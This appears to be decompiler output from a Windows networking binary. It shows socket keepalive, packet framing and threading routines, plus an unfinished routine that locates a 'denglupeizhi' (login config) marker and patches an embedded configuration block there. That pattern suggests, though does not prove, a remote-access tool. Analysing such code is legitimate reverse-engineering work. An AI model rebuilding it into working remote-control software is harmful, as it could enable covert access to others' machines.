  local_8 = *(HANDLE *)(unaff_ESI + 0x54);
  iVar1 = FUN_00402bd0(&local_8);
  if (iVar1 == 0) goto LAB_004041ad;
  if (iVar1 == 0x102) {
LAB_00404198:
    SetLastError(0x5b4);
  }
  else if (iVar1 != -1) {
    FUN_00401280();
    goto LAB_00404198;
  }
  FUN_00401280();
LAB_004041ad:
  CloseHandle(*(HANDLE *)(unaff_ESI + 0x54));
  *(undefined4 *)(unaff_ESI + 0x54) = 0;
  *(undefined4 *)(unaff_ESI + 0x58) = 0;
  return;
}



/* Function: FUN_004041d0 */

undefined4 FUN_004041d0(void)

{
  int iVar1;
  int iVar2;
  int unaff_ESI;
  int unaff_EDI;
  
  EnterCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
  if (*(int *)(unaff_ESI + 0x60) == 0) {
    LeaveCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
    return 0x139f;
  }
  iVar1 = *(int *)(unaff_ESI + 0x194);
  *(int *)(unaff_ESI + 0x194) =
       *(int *)(unaff_ESI + 0x194) +
       (*(int *)(*(int *)(unaff_EDI + 4) + 0x18) - *(int *)(*(int *)(unaff_EDI + 4) + 0x14));
  iVar2 = *(int *)(unaff_EDI + 4);
  *(undefined4 *)(unaff_EDI + 4) = 0;
  if (*(int *)(unaff_ESI + 0x180) == 0) {
    *(undefined4 *)(iVar2 + 8) = 0;
    *(undefined4 *)(iVar2 + 4) = 0;
    *(int *)(unaff_ESI + 0x17c) = iVar2;
  }
  else {
    *(int *)(*(int *)(unaff_ESI + 0x180) + 4) = iVar2;
    *(undefined4 *)(iVar2 + 8) = *(undefined4 *)(unaff_ESI + 0x180);
  }
  *(int *)(unaff_ESI + 0x178) = *(int *)(unaff_ESI + 0x178) + 1;
  *(int *)(unaff_ESI + 0x180) = iVar2;
  LeaveCriticalSection((LPCRITICAL_SECTION)(unaff_ESI + 0x160));
  if ((iVar1 == 0) && (0 < *(int *)(unaff_ESI + 0x194))) {
    SetEvent(*(HANDLE *)(unaff_ESI + 0x188));
  }
  return 0;
}



/* Function: FUN_00404270 */

bool FUN_00404270(int param_1)

{
  void *in_EAX;
  DWORD dwErrCode;
  int local_c;
  undefined4 local_8;
  
  if (in_EAX == (void *)0x0) {
    dwErrCode = 0x57;
  }
  else if (*(int *)(param_1 + 0x60) == 0) {
    dwErrCode = 0x139f;
  }
  else {
    local_c = param_1 + 0x7c;
    local_8 = FUN_004013a0();
    FUN_00401300(in_EAX);
    dwErrCode = FUN_004041d0();
    FUN_00404c60((int)&local_c);
    if (dwErrCode == 0) goto LAB_004042c3;
  }
  SetLastError(dwErrCode);
LAB_004042c3:
  return dwErrCode == 0;
}



/* Function: FUN_004042f0 */

bool __fastcall FUN_004042f0(undefined4 param_1,void *param_2,int param_3)

{
  size_t in_EAX;
  DWORD dwErrCode;
  
  if (((param_2 != (void *)0x0) && (0 < (int)in_EAX)) && ((int)in_EAX <= *(int *)(param_3 + 0x1c0)))
  {
    if (*(int *)(param_3 + 0x60) != 0) {
      dwErrCode = FUN_00404be0(param_3 + 0x1d8,param_2,in_EAX);
      if (dwErrCode != 0) {
        SetLastError(dwErrCode);
      }
      return dwErrCode == 0;
    }
    SetLastError(0x139f);
    return false;
  }
  SetLastError(0x57);
  return false;
}



/* Function: FUN_00404370 */

undefined4 __cdecl FUN_00404370(void *param_1,int param_2,undefined4 param_3,int param_4)

{
  DWORD dwErrCode;
  undefined4 uVar1;
  int local_c;
  undefined4 local_8;
  
  if ((param_1 == (void *)0x0) || (0x597 < param_2 - 1U)) {
    SetLastError(0x57);
    return 0;
  }
  if (*(int *)(param_4 + 0x60) == 0) {
    SetLastError(0x139f);
    return 0;
  }
  local_c = param_4 + 0x7c;
  local_8 = FUN_004013a0();
  FUN_00401300(param_1);
  dwErrCode = FUN_004041d0();
  FUN_00404c60((int)&local_c);
  if (dwErrCode != 0) {
    SetLastError(dwErrCode);
    return 0;
  }
  uVar1 = Ordinal_111();
  return uVar1;
}



/* Function: FUN_00404410 */

void __fastcall FUN_00404410(int param_1)

{
  InterlockedExchange((LONG *)(param_1 + 0x18),0);
  return;
}



/* Function: FUN_00404420 */

uint __thiscall FUN_00404420(void *this,LPCWSTR param_1,undefined4 param_2)

{
  DWORD DVar1;
  uint uVar2;
  uintptr_t uVar3;
  void *local_8;
  
  local_8 = this;
  ResetEvent(*(HANDLE *)((int)this + 4));
  ResetEvent(*(HANDLE *)((int)this + 0x264));
  DVar1 = timeGetTime();
  *(DWORD *)((int)this + 0x14) = DVar1;
  InterlockedExchange((LONG *)((int)this + 0x18),0);
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined4 *)((int)this + 0x24) = 0;
  *(undefined2 *)((int)this + 0x28) = 0;
  *(undefined4 *)((int)this + 0x20) = *(undefined4 *)((int)this + 0x14);
  *(undefined4 *)((int)this + 0x24) = *(undefined4 *)((int)this + 0x18);
  *(undefined2 *)((int)this + 0x28) = 0xca;
  if (*(int *)((int)this + 100) != 3) {
    FUN_00403f50();
  }
  FUN_004034e0(param_1,param_2);
  uVar2 = WaitForSingleObject(*(HANDLE *)((int)this + 0x264),6000);
  if (uVar2 != 0) {
    if (uVar2 == 0x102) {
      uVar2 = ResetEvent(*(HANDLE *)((int)this + 0x264));
    }
    else if (uVar2 == 0xffffffff) {
      uVar2 = ResetEvent(*(HANDLE *)((int)this + 0x264));
      return uVar2 & 0xffffff00;
    }
    return uVar2 & 0xffffff00;
  }
  InterlockedExchange((LONG *)((int)this + 0x18),1);
  ResetEvent(*(HANDLE *)((int)this + 0x264));
  uVar3 = __beginthreadex((void *)0x0,0,FUN_00404520,this,0,(uint *)&local_8);
  *(uintptr_t *)((int)this + 0x268) = uVar3;
  return CONCAT31((int3)(uVar3 >> 8),1);
}



/* Function: FUN_00404520 */

undefined4 FUN_00404520(int *param_1)

{
  LONG *Destination;
  code *pcVar1;
  DWORD DVar2;
  LONG LVar3;
  undefined4 uVar4;
  int iVar5;
  uint uVar6;
  HANDLE local_c;
  undefined1 local_5;
  
  iVar5 = param_1[6];
  local_5 = 0xc9;
  do {
    if (iVar5 == 0) {
      return 0;
    }
    iVar5 = 0;
    do {
      if (param_1[6] == 0) goto LAB_0040456b;
      Sleep(100);
      iVar5 = iVar5 + 1;
    } while (iVar5 < 100);
    if (param_1[6] != 0) {
      (**(code **)(*param_1 + 8))(&local_5,1);
    }
LAB_0040456b:
    DVar2 = timeGetTime();
    if ((30000 < DVar2 - param_1[5]) && (param_1[0x19] != 3)) {
      DVar2 = GetCurrentThreadId();
      if (param_1[0x19] != 3) {
        Destination = param_1 + 0x57;
        uVar6 = 0;
        while (LVar3 = InterlockedCompareExchange(Destination,1,0), LVar3 != 0) {
          if ((uVar6 & 0xfff) == 0xfff) {
            SwitchToThread();
            uVar6 = uVar6 + 1;
          }
          else {
            uVar6 = uVar6 + 1;
          }
        }
        if ((param_1[0x19] == 1) || (param_1[0x19] == 0)) {
          param_1[0x19] = 2;
          *Destination = 0;
          if (param_1[0x15] != 0) {
            if (DVar2 != param_1[0x16]) {
              SetEvent((HANDLE)param_1[99]);
              local_c = (HANDLE)param_1[0x15];
              iVar5 = FUN_00402bd0(&local_c);
              if (iVar5 != 0) {
                if (iVar5 == 0x102) {
                  SetLastError(0x5b4);
                }
                FUN_00401280();
                pcVar1 = (code *)swi(3);
                uVar4 = (*pcVar1)();
                return uVar4;
              }
            }
            CloseHandle((HANDLE)param_1[0x15]);
            param_1[0x15] = 0;
            param_1[0x16] = 0;
          }
          if (param_1[0x18] != 0) {
            if (param_1[0xf] != 0) {
              Ordinal_19(param_1[0x10],&DAT_00417440,0x10,0);
            }
            param_1[0x18] = 0;
          }
          if (param_1[0xc] != 0) {
            FUN_00402c50();
            SetEvent((HANDLE)param_1[1]);
            InterlockedExchange(param_1 + 6,0);
          }
          if (param_1[0x11] != 0) {
            WSACloseEvent(param_1[0x11]);
            param_1[0x11] = 0;
          }
          if (param_1[0x10] != -1) {
            Ordinal_22(param_1[0x10],1);
            Ordinal_3(param_1[0x10]);
            param_1[0x10] = -1;
          }
          FUN_00404050();
          goto LAB_004046bf;
        }
        *Destination = 0;
      }
      param_1[0x17] = 1;
      SetLastError(0x139f);
    }
LAB_004046bf:
    iVar5 = param_1[6];
  } while( true );
}



/* Function: FUN_00404710 */

undefined4 __thiscall FUN_00404710(void *this,void *param_1,size_t param_2)

{
  int *piVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  LONG LVar4;
  uint uVar5;
  undefined4 extraout_ECX;
  
  DVar3 = GetCurrentThreadId();
  if (*(DWORD *)((int)this + 0xc) != DVar3) {
    do {
      LVar4 = InterlockedExchange((LONG *)((int)this + 8),1);
    } while (LVar4 == 1);
    *(DWORD *)((int)this + 0xc) = DVar3;
  }
  *(int *)((int)this + 0x10) = *(int *)((int)this + 0x10) + 1;
  FUN_00401100();
  **(int **)((int)this + 0x25c) = param_2 + 0xe;
  *(int *)((int)this + 0x25c) = *(int *)((int)this + 0x25c) + 4;
  FUN_00401100();
  puVar2 = *(undefined4 **)((int)this + 0x25c);
  *puVar2 = *(undefined4 *)((int)this + 0x20);
  puVar2[1] = *(undefined4 *)((int)this + 0x24);
  *(undefined2 *)(puVar2 + 2) = *(undefined2 *)((int)this + 0x28);
  *(int *)((int)this + 0x25c) = *(int *)((int)this + 0x25c) + 10;
  FUN_00401060(param_1,param_2,1,(int)this + 0x20);
  if (*(int *)((int)this + 600) == 0) {
    uVar5 = 0;
  }
  else {
    uVar5 = *(int *)((int)this + 0x25c) - *(int *)((int)this + 600);
  }
  FUN_00404810(uVar5);
  *(undefined4 *)((int)this + 0x25c) = *(undefined4 *)((int)this + 600);
  FUN_004011b0(extraout_ECX,0x400);
  DVar3 = GetCurrentThreadId();
  if (DVar3 == *(DWORD *)((int)this + 0xc)) {
    piVar1 = (int *)((int)this + 0x10);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      *(undefined4 *)((int)this + 0xc) = 0;
      *(LONG *)((int)this + 8) = 0;
    }
  }
  return 1;
}



/* Function: FUN_00404810 */

undefined4 FUN_00404810(uint param_1)

{
  uint uVar1;
  void *in_EAX;
  DWORD dwErrCode;
  uint uVar2;
  int unaff_EDI;
  
  uVar1 = param_1;
  uVar2 = 0;
  if (3999 < param_1) {
    param_1 = param_1 / 4000;
    if (param_1 != 0) {
      uVar2 = param_1 * 4000;
      do {
        if ((in_EAX == (void *)0x0) || (*(int *)(unaff_EDI + 0x1c0) < 4000)) {
          dwErrCode = 0x57;
LAB_0040486d:
          SetLastError(dwErrCode);
        }
        else {
          if (*(int *)(unaff_EDI + 0x60) == 0) {
            dwErrCode = 0x139f;
            goto LAB_0040486d;
          }
          dwErrCode = FUN_00404be0(unaff_EDI + 0x1d8,in_EAX,4000);
          if (dwErrCode != 0) goto LAB_0040486d;
        }
        in_EAX = (void *)((int)in_EAX + 4000);
        param_1 = param_1 - 1;
      } while (param_1 != 0);
    }
    if (3999 < uVar1 - uVar2) {
      return 1;
    }
    if (uVar1 == uVar2) {
      return 1;
    }
  }
  FUN_004042f0(uVar2,in_EAX,unaff_EDI);
  return 1;
}



/* Function: FUN_004048c0 */

void __fastcall FUN_004048c0(int param_1)

{
  WaitForSingleObject(*(HANDLE *)(param_1 + 4),0xffffffff);
  WaitForSingleObject(*(HANDLE *)(param_1 + 0x268),0xffffffff);
  Sleep(600);
  if (*(int *)(param_1 + 100) != 3) {
    FUN_00403f50();
  }
  CloseHandle(*(HANDLE *)(param_1 + 4));
  CloseHandle(*(HANDLE *)(param_1 + 0x264));
  *(undefined4 *)(*(int *)(param_1 + 0x1c) + 8) = 1;
  Sleep(300);
  return;
}



/* Function: FUN_00404930 */

undefined4 __fastcall FUN_00404930(int param_1)

{
  return *(undefined4 *)(param_1 + 0x18);
}



/* Function: FUN_00404940 */

undefined4 FUN_00404940(int param_1,void *param_2,size_t param_3)

{
  void *_Dst;
  uint *puVar1;
  uint *puVar2;
  DWORD DVar3;
  int iVar4;
  uint *puVar5;
  uint extraout_ECX;
  uint uVar6;
  uint *puVar7;
  uint uVar8;
  uint uVar9;
  
  FUN_00401100();
  FID_conflict__memcpy(*(void **)(param_1 + 0x23c),param_2,param_3);
  *(int *)(param_1 + 0x23c) = *(int *)(param_1 + 0x23c) + param_3;
LAB_00404982:
  do {
    do {
      if (*(int *)(param_1 + 0x238) == 0) {
        return 0;
      }
      iVar4 = *(int *)(param_1 + 0x23c) - *(int *)(param_1 + 0x238);
      if (iVar4 < 0xf) {
        return 0;
      }
      uVar8 = 10;
      puVar1 = *(uint **)(param_1 + 0x238) + 1;
      puVar7 = (uint *)(param_1 + 0x20);
      do {
        puVar5 = puVar7;
        puVar2 = puVar1;
        puVar7 = puVar5;
        if (*puVar5 != *puVar2) goto LAB_00404ac4;
        uVar8 = uVar8 - 4;
        puVar7 = puVar5 + 1;
        puVar1 = puVar2 + 1;
      } while (3 < uVar8);
      if (((char)puVar2[1] != (char)*puVar7) ||
         (*(char *)((int)puVar2 + 5) != *(char *)((int)puVar5 + 5))) {
LAB_00404ac4:
        *(undefined4 *)(param_1 + 0x23c) = *(undefined4 *)(param_1 + 0x238);
        FUN_004011b0(puVar7,0x400);
        return 0;
      }
      uVar8 = **(uint **)(param_1 + 0x238);
      if (uVar8 == 0) {
        return 0;
      }
      if (iVar4 < (int)uVar8) {
        return 0;
      }
      DVar3 = timeGetTime();
      *(DWORD *)(param_1 + 0x14) = DVar3;
      *(undefined4 *)(param_1 + 0x24c) = *(undefined4 *)(param_1 + 0x248);
      FUN_004011b0(*(undefined4 *)(param_1 + 0x248),0x400);
      FUN_00401060((void *)(*(int *)(param_1 + 0x238) + 0xe),uVar8 - 0xe,1,param_1 + 0x20);
      if (*(int *)(param_1 + 0x248) == 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = *(int *)(param_1 + 0x24c) - *(int *)(param_1 + 0x248);
      }
      (**(code **)**(undefined4 **)(param_1 + 0x1c))(*(undefined4 *)(param_1 + 0x248),iVar4);
      uVar6 = *(uint *)(param_1 + 0x240);
    } while (uVar6 < uVar8);
    _Dst = *(void **)(param_1 + 0x238);
    if (_Dst == (void *)0x0) {
      uVar9 = 0;
    }
    else {
      uVar9 = *(int *)(param_1 + 0x23c) - (int)_Dst;
    }
    if (uVar9 < uVar8) {
      if (_Dst != (void *)0x0) {
        uVar8 = *(int *)(param_1 + 0x23c) - (int)_Dst;
        goto LAB_00404a87;
      }
LAB_00404aa5:
      FUN_004011b0(uVar6,0);
      goto LAB_00404982;
    }
LAB_00404a87:
    if (uVar8 != 0) {
      FID_conflict__memcpy(_Dst,(void *)((int)_Dst + uVar8),uVar6 - uVar8);
      *(int *)(param_1 + 0x23c) = *(int *)(param_1 + 0x23c) - uVar8;
      uVar6 = extraout_ECX;
    }
    if (*(int *)(param_1 + 0x238) == 0) goto LAB_00404aa5;
    FUN_004011b0(uVar6,*(int *)(param_1 + 0x23c) - *(int *)(param_1 + 0x238));
  } while( true );
}



/* Function: FUN_00404ae0 */

void __thiscall FUN_00404ae0(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 0x1c) = param_1;
  return;
}



/* Function: FUN_00404af0 */

undefined4 * __thiscall FUN_00404af0(void *this,undefined4 *param_1,int *param_2)

{
  undefined4 *puVar1;
  int *piVar2;
  undefined4 in_EAX;
  LONG LVar3;
  DWORD DVar4;
  
  puVar1 = param_1;
  param_1[1] = in_EAX;
  param_1[2] = this;
  param_1 = (undefined4 *)timeGetTime();
  LVar3 = InterlockedIncrement((LONG *)&param_1);
  puVar1[7] = LVar3;
  if (LVar3 == 0) {
    LVar3 = InterlockedIncrement((LONG *)&param_1);
    puVar1[7] = LVar3;
  }
  piVar2 = param_2;
  FUN_004051b0(param_2);
  (**(code **)*puVar1)(piVar2);
  DVar4 = timeGetTime();
  puVar1[6] = DVar4;
  puVar1[4] = DVar4;
  puVar1[5] = 0;
  puVar1[3] = 0;
  puVar1[9] = 1;
  FUN_00404ca0((int)puVar1);
  return puVar1;
}



/* Function: FUN_00404b60 */

undefined4 FUN_00404b60(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION lpCriticalSection_00;
  int *in_EAX;
  
  if (in_EAX[9] == 0) {
    return 0;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)(in_EAX + 10);
  EnterCriticalSection(lpCriticalSection);
  lpCriticalSection_00 = (LPCRITICAL_SECTION)(in_EAX + 0x10);
  EnterCriticalSection(lpCriticalSection_00);
  if (in_EAX[9] == 0) {
    LeaveCriticalSection(lpCriticalSection_00);
    LeaveCriticalSection(lpCriticalSection);
    return 0;
  }
  in_EAX[9] = 0;
  if ((void *)in_EAX[0x16] != (void *)0x0) {
    FUN_00401830((void *)in_EAX[0x16]);
    in_EAX[0x16] = 0;
  }
  LeaveCriticalSection(lpCriticalSection_00);
  LeaveCriticalSection(lpCriticalSection);
  (**(code **)(*in_EAX + 4))();
  return 1;
}



/* Function: FUN_00404be0 */

int FUN_00404be0(int param_1,void *param_2,size_t param_3)

{
  int iVar1;
  
  if (*(int *)(param_1 + 0x24) != 2) {
    return 0x139f;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x40));
  if (*(int *)(param_1 + 0x24) != 2) {
    LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x40));
    return 0x139f;
  }
  iVar1 = FUN_00401b90(param_2,param_3);
  if (iVar1 != 0) {
    iVar1 = 0x5b6;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x40));
  if (iVar1 == 0) {
    FUN_00404e70(1);
  }
  return iVar1;
}



/* Function: FUN_00404c60 */

void FUN_00404c60(int param_1)

{
  undefined4 *lpMem;
  int iVar1;
  
  lpMem = *(undefined4 **)(param_1 + 4);
  if (lpMem != (undefined4 *)0x0) {
    iVar1 = FUN_00401480((LONG)lpMem);
    if (iVar1 == 0) {
      HeapFree(*(HANDLE *)*lpMem,0,lpMem);
    }
  }
  *(undefined4 *)(param_1 + 4) = 0;
  return;
}



/* Function: FUN_00404ca0 */

bool __fastcall FUN_00404ca0(int param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  undefined4 uVar1;
  int iVar2;
  undefined4 uVar3;
  bool bVar4;
  DWORD DVar5;
  DWORD DVar6;
  int iVar7;
  undefined2 *puVar8;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00414230;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if (*(int *)(param_1 + 0x24) == 0) {
    SetLastError(0x139f);
    ExceptionList = local_10;
    return false;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)(param_1 + 0x28);
  local_8 = 0;
  EnterCriticalSection(lpCriticalSection);
  local_8 = CONCAT31(local_8._1_3_,1);
  if (*(int *)(param_1 + 0x24) == 0) {
    SetLastError(0x139f);
    LeaveCriticalSection(lpCriticalSection);
    FUN_0040747b((void *)0x0);
    ExceptionList = local_10;
    return false;
  }
  DVar5 = timeGetTime();
  iVar7 = *(int *)(param_1 + 0x18);
  DVar6 = DVar5;
  if (DVar5 == 0) {
    DVar6 = timeGetTime();
  }
  if (*(uint *)(*(int *)(param_1 + 4) + 0x1c4) < DVar6 - iVar7) {
    SetLastError(0x5b4);
    LeaveCriticalSection(lpCriticalSection);
    FUN_0040747b((void *)0x0);
    ExceptionList = local_10;
    return false;
  }
  iVar7 = *(int *)(param_1 + 0x10);
  DVar6 = DVar5;
  if (DVar5 == 0) {
    DVar6 = timeGetTime();
  }
  if ((int)(DVar6 - iVar7) < 0) {
    LeaveCriticalSection(lpCriticalSection);
    FUN_0040747b((void *)0x0);
    bVar4 = true;
  }
  else {
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
    if ((uint)(*(int *)(*(int *)(param_1 + 0x58) + 0x50) * *(int *)(param_1 + 0x14)) < 2000) {
      iVar7 = *(int *)(param_1 + 0x14) + 1;
      *(int *)(param_1 + 0x14) = iVar7;
      iVar7 = *(int *)(*(int *)(param_1 + 0x58) + 0x50) * iVar7;
    }
    else {
      iVar7 = 2000;
    }
    uVar1 = *(undefined4 *)(param_1 + 0x20);
    iVar2 = *(int *)(param_1 + 0x24);
    *(DWORD *)(param_1 + 0x10) = iVar7 + DVar5;
    uVar3 = *(undefined4 *)(param_1 + 0x1c);
    puVar8 = (undefined2 *)FUN_004069bf(0xc);
    *puVar8 = 0xbb4f;
    *(undefined1 *)(puVar8 + 1) = 1;
    *(bool *)((int)puVar8 + 3) = iVar2 == 2;
    *(undefined4 *)(puVar8 + 2) = uVar3;
    *(undefined4 *)(puVar8 + 4) = uVar1;
    FUN_0040747b((void *)0x0);
    LeaveCriticalSection(lpCriticalSection);
    bVar4 = FUN_00404270(*(int *)(param_1 + 4));
    FUN_0040747b(puVar8);
  }
  ExceptionList = local_10;
  return bVar4;
}



/* Function: FUN_00404e70 */

undefined4 FUN_00404e70(int param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION lpCriticalSection_00;
  int in_EAX;
  BOOL BVar1;
  DWORD DVar2;
  
  if (*(int *)(in_EAX + 0x24) != 2) {
    SetLastError(0x139f);
    return 0;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)(in_EAX + 0x28);
  BVar1 = TryEnterCriticalSection(lpCriticalSection);
  if (BVar1 != 0) {
    lpCriticalSection_00 = (LPCRITICAL_SECTION)(in_EAX + 0x40);
    BVar1 = TryEnterCriticalSection(lpCriticalSection_00);
    if (BVar1 != 0) {
      if (*(int *)(in_EAX + 0x24) != 2) {
        SetLastError(0x139f);
        LeaveCriticalSection(lpCriticalSection_00);
        LeaveCriticalSection(lpCriticalSection);
        return 0;
      }
      if (param_1 == 0) {
        DVar2 = timeGetTime();
        FUN_00402aa0(DVar2);
      }
      else {
        FUN_004024b0();
      }
      LeaveCriticalSection(lpCriticalSection_00);
    }
    LeaveCriticalSection(lpCriticalSection);
  }
  return 1;
}



/* Function: FUN_00404f20 */

undefined4 FUN_00404f20(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  byte bVar1;
  int iVar2;
  int iVar3;
  short *in_EAX;
  DWORD DVar4;
  int unaff_ESI;
  undefined4 uVar5;
  
  bVar1 = *(byte *)((int)in_EAX + 3);
  iVar2 = *(int *)(in_EAX + 2);
  iVar3 = *(int *)(in_EAX + 4);
  if (((*in_EAX != -0x44b1) || ((char)in_EAX[1] != '\x01')) || ((bVar1 & 0xfe) != 0)) {
    Ordinal_112(0xd);
    return 2;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)(unaff_ESI + 0x28);
  EnterCriticalSection(lpCriticalSection);
  if (*(int *)(unaff_ESI + 0x24) == 0) {
    uVar5 = 0x139f;
    goto LAB_00404f7a;
  }
  if (*(int *)(unaff_ESI + 0x24) == 2) {
    if (iVar2 == *(int *)(unaff_ESI + 0x20)) {
      if (iVar3 == *(int *)(unaff_ESI + 0x1c)) goto LAB_0040503a;
      if (iVar3 == 0) {
        iVar2 = *(int *)(unaff_ESI + 0x18);
        DVar4 = timeGetTime();
        if (DVar4 - iVar2 <= (uint)(*(int *)(*(int *)(unaff_ESI + 4) + 0x1c4) * 2))
        goto LAB_0040503a;
      }
    }
  }
  else {
    if (*(int *)(unaff_ESI + 0x20) == 0) {
      *(int *)(unaff_ESI + 0x20) = iVar2;
      DVar4 = timeGetTime();
      *(DWORD *)(unaff_ESI + 0x10) = DVar4;
      *(undefined4 *)(unaff_ESI + 0x14) = 0;
    }
    else if (iVar2 != *(int *)(unaff_ESI + 0x20)) goto LAB_00404fc6;
    if (iVar3 == *(int *)(unaff_ESI + 0x1c)) {
      iVar2 = *(int *)(unaff_ESI + 4);
      *(undefined4 *)(unaff_ESI + 0x24) = 2;
      FUN_00402c50();
      SetEvent(*(HANDLE *)(iVar2 + 0x264));
      InterlockedExchange((LONG *)(iVar2 + 0x18),1);
      LeaveCriticalSection(lpCriticalSection);
      return 0;
    }
    if (iVar3 == 0) {
LAB_0040503a:
      LeaveCriticalSection(lpCriticalSection);
      if ((*(int *)(unaff_ESI + 0xc) == 0) && (bVar1 == 1)) {
        *(undefined4 *)(unaff_ESI + 0xc) = 1;
      }
      FUN_00404ca0(unaff_ESI);
      return 0;
    }
  }
LAB_00404fc6:
  uVar5 = 0x2746;
LAB_00404f7a:
  Ordinal_112(uVar5);
  LeaveCriticalSection(lpCriticalSection);
  return 2;
}



/* Function: FUN_00405070 */

undefined4 FUN_00405070(int param_1,int param_2,int param_3)

{
  LPCRITICAL_SECTION lpCriticalSection;
  uint uVar1;
  int iVar2;
  size_t sVar3;
  int unaff_ESI;
  void *unaff_EDI;
  undefined4 uVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004141f8;
  local_10 = ExceptionList;
  uVar1 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  if (*(int *)(unaff_ESI + 0x24) != 2) {
    return 1;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)(unaff_ESI + 0x28);
  ExceptionList = &local_10;
  EnterCriticalSection(lpCriticalSection);
  local_8 = 0;
  if (*(int *)(unaff_ESI + 0x24) == 2) {
    if ((param_2 < 0x18) ||
       (iVar2 = FUN_00402140(*(int **)(unaff_ESI + 0x58),param_1,param_2), iVar2 != 0)) {
      uVar4 = 0xd;
    }
    else {
      sVar3 = FUN_004019d0(unaff_EDI,param_3);
      while (-1 < (int)sVar3) {
        iVar2 = FUN_00404940(*(int *)(unaff_ESI + 4),unaff_EDI,sVar3);
        if (iVar2 == 2) goto LAB_004050d8;
        sVar3 = FUN_004019d0(unaff_EDI,param_3);
      }
      if (sVar3 != 0xfffffffd) {
        LeaveCriticalSection(lpCriticalSection);
        FUN_00404e70(1);
        ExceptionList = local_10;
        return 0;
      }
      uVar4 = 0x5b6;
    }
    Ordinal_112(uVar4,uVar1);
    LeaveCriticalSection(lpCriticalSection);
    ExceptionList = local_10;
    return 2;
  }
  Ordinal_112(0x139f,uVar1);
LAB_004050d8:
  LeaveCriticalSection(lpCriticalSection);
  ExceptionList = local_10;
  return 2;
}



/* Function: FUN_004051b0 */

void FUN_004051b0(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;
  int iVar6;
  int unaff_ESI;
  
  if (*(void **)(unaff_ESI + 0x58) != (void *)0x0) {
    FUN_00401830(*(void **)(unaff_ESI + 0x58));
    *(undefined4 *)(unaff_ESI + 0x58) = 0;
  }
  *(undefined4 *)(unaff_ESI + 0x20) = 0;
  puVar4 = FUN_004016a0(*(undefined4 *)(unaff_ESI + 0x1c),*(undefined4 *)(unaff_ESI + 8));
  *(undefined4 **)(unaff_ESI + 0x58) = puVar4;
  iVar1 = param_1[2];
  iVar2 = param_1[1];
  iVar3 = *param_1;
  iVar6 = param_1[3];
  puVar4[0x1b] = (uint)(iVar3 != 0);
  puVar4[0xd] = (-(uint)((iVar3 != 0) != 0) & 0xffffffba) + 100;
  if (-1 < iVar6) {
    if (iVar6 < 0x1389) {
      if (iVar6 < 10) {
        iVar6 = 10;
      }
    }
    else {
      iVar6 = 5000;
    }
    puVar4[0x14] = iVar6;
  }
  if (-1 < iVar1) {
    puVar4[0x2e] = iVar1;
  }
  puVar4[0x30] = (uint)(iVar2 != 0);
  iVar1 = *(int *)(unaff_ESI + 0x58);
  uVar5 = param_1[5];
  if (iVar1 != 0) {
    if (0 < param_1[4]) {
      *(int *)(iVar1 + 0x38) = param_1[4];
    }
    if (0 < (int)uVar5) {
      if (uVar5 < 0x80) {
        uVar5 = 0x80;
      }
      *(uint *)(iVar1 + 0x3c) = uVar5;
    }
  }
  FUN_00402af0();
  *(int *)(*(int *)(unaff_ESI + 0x58) + 0x34) = param_1[6];
  *(int *)(*(int *)(unaff_ESI + 0x58) + 0xbc) = param_1[8];
  *(code **)(*(int *)(unaff_ESI + 0x58) + 0xcc) = FUN_00404370;
  return;
}



/* Function: FUN_004052b0 */

void FUN_004052b0(void)

{
  undefined4 *in_EAX;
  
  FUN_0040747b((void *)*in_EAX);
  return;
}



/* Function: FUN_004052c0 */

undefined4 FUN_004052c0(int param_1)

{
  int iVar1;
  HANDLE hProcess;
  BOOL BVar2;
  int iVar3;
  HKEY local_20;
  DWORD aDStack_1c [6];
  
  iVar3 = 0;
  if (0 < DAT_0041bf98) {
    do {
      iVar1 = 0;
      do {
        if (DAT_0041c7d4[iVar1 + iVar3] != (code)"denglupeizhi"[iVar1]) break;
        if (DAT_0041c7d4[iVar1 + iVar3 + 1] != (code)"denglupeizhi"[iVar1 + 1]) {
          iVar1 = iVar1 + 1;
          break;
        }
        if (DAT_0041c7d4[iVar1 + iVar3 + 2] != (code)"denglupeizhi"[iVar1 + 2]) {
          iVar1 = iVar1 + 2;
          break;
        }
        if (DAT_0041c7d4[iVar1 + iVar3 + 3] != (code)"denglupeizhi"[iVar1 + 3]) {
          iVar1 = iVar1 + 3;
          break;
        }
        if (DAT_0041c7d4[iVar1 + iVar3 + 4] != (code)"denglupeizhi"[iVar1 + 4]) {
          iVar1 = iVar1 + 4;
          break;
        }
        if (DAT_0041c7d4[iVar1 + iVar3 + 5] != (code)"denglupeizhi"[iVar1 + 5]) {
          iVar1 = iVar1 + 5;
          break;
        }
        iVar1 = iVar1 + 6;
      } while (iVar1 < 0xc);
      if (iVar1 == 0xc) {
        if (iVar3 != -1) {
          FID_conflict__memcpy(DAT_0041c7d4 + iVar3,&DAT_0041c7d8,0x12a0);
        }
        break;
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 < DAT_0041bf98);
